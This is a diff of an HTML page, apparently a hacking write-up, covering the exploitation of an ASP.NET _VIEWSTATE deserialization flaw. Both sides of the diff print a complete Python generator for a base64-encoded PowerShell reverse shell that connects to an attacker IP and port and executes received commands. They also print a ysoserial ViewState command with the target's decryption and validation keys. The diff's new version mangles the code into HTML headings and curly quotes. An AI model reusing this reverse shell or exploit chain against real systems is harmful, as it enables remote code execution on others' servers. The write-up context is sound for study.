@@ -90,22 +90,29 @@ There is some information and _VIEWSTATE parameter has a vulnerability
 <img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_5.png" alt="Untitled" />
 <br /><br />
 We use this script to create a reverse powershell with base64 encoded
-<br /><br /></p>
-    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-# generate reverse powershell cmdline with base64 encoded args
-</span><span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">base64</span>
-<span class="k">def</span> <span class="nf">help</span><span class="p">():</span>
-  <span class="k">print</span><span class="p">(</span><span class="s">"USAGE: %s IP PORT"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
-  <span class="k">print</span><span class="p">(</span><span class="s">"Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT"</span><span class="p">)</span>
-  <span class="nb">exit</span><span class="p">()</span>   
-<span class="k">try</span><span class="p">:</span>
-  <span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
-<span class="k">except</span><span class="p">:</span>
-  <span class="n">help</span><span class="p">()</span>
-<span class="c1"># payload from Nikhil Mittal @samratashok
-# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
-#1. It creates a TCP client in powershell 
+<br /><br />
+```python
+#!/usr/bin/env python3</p>
+    <h1 id="generate-reverse-powershell-cmdline-with-base64-encoded-args">generate reverse powershell cmdline with base64 encoded args</h1>
+  </li>
+</ul>
+
+<p>import sys
+import base64</p>
+
+<p>def help():
+    print(“USAGE: %s IP PORT” % sys.argv[0])
+    print(“Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT”)
+    exit()</p>
+
+<p>try:
+    (ip, port) = (sys.argv[1], int(sys.argv[2]))
+except:
+    help()</p>
+
+<h1 id="payload-from-nikhil-mittal-samratashok">payload from Nikhil Mittal @samratashok</h1>
+<h1 id="httpsgistgithubcomegre55c058744a4240af6515eb32b2d33fbed3">https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3</h1>
+<p>#1. It creates a TCP client in powershell 
 #2. Creates a data flow used to comunication with the server
 #3. Prepare an array to save recieve data
 #4. We have a while loop to keep the connection
@@ -115,31 +122,31 @@ We use this script to create a reverse powershell with base64 encoded
 #8. Convert to bytes
 #9. Send bytes to data flow
 #10. Close connection
-</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'$client = New-Object System.Net.Sockets.TCPClient("%s",%d);
+payload = ‘$client = New-Object System.Net.Sockets.TCPClient(“%s”,%d);
 $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
 $sendback = (iex $data 2&gt;&amp;1 | Out-String );
-$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";
+$sendback2 = $sendback + “PS “ + (pwd).Path + “&gt; “;
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
 $stream.Write($sendbyte,0,$sendbyte.Length);
 $stream.Flush()};
-$client.Close()'</span>
-<span class="c1">#Take a commands chain  and replace their parts with the ip and port given
-</span><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-<span class="c1">#We enconde the payload to utf16 because it is the default encode chain
+$client.Close()’
+#Take a commands chain  and replace their parts with the ip and port given
+payload = payload % (ip, port)</p>
+
+<p>#We enconde the payload to utf16 because it is the default encode chain
 #The is encode to base 64
 #Finally we encode to UNICODE which helps to limit the characters
-</span><span class="n">cmdline</span> <span class="o">=</span> <span class="s">"powershell -e "</span> <span class="o">+</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf16'</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]).</span><span class="n">decode</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">cmdline</span><span class="p">)</span>
-</code></pre></div>    </div>
-  </li>
-</ul>
+cmdline = “powershell -e “ + base64.b64encode(payload.encode(‘utf16’)[2:]).decode()</p>
 
-<p><br /><br />
-<img src="/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_6.png" alt="Untitled" />
-<br /><br /></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./ysoserial.exe <span class="nt">-p</span> ViewState <span class="nt">-g</span> TypeConfuseDelegate <span class="nt">-c</span> <span class="s2">"yourpaload"</span> <span class="nt">--path</span><span class="o">=</span><span class="s2">"/portfolio/default.aspx"</span> <span class="nt">--appath</span><span class="o">=</span><span class="s2">"/"</span> <span class="nt">--decryptionalg</span><span class="o">=</span><span class="s2">"AES"</span> <span class="nt">--decryptionkey</span><span class="o">=</span><span class="s2">"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"</span> <span class="nt">--validationalg</span><span class="o">=</span><span class="s2">"SHA1"</span> <span class="nt">--validationkey</span><span class="o">=</span><span class="s2">"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"</span>
+<p>print(cmdline)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+&lt;br/&gt;&lt;br/&gt;
+![Untitled](/assets/images/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254/cec5d0f0-764b-4005-9f93-0106f9cc1339-export-4ac175f3-58e3-48bd-ba40-ea331e233254_Untitled_6.png)
+&lt;br/&gt;&lt;br/&gt;
+```bash
+./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "yourpaload" --path="/portfolio/default.aspx" --appath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
 </code></pre></div></div>
 
 <p><br /><br /></p>
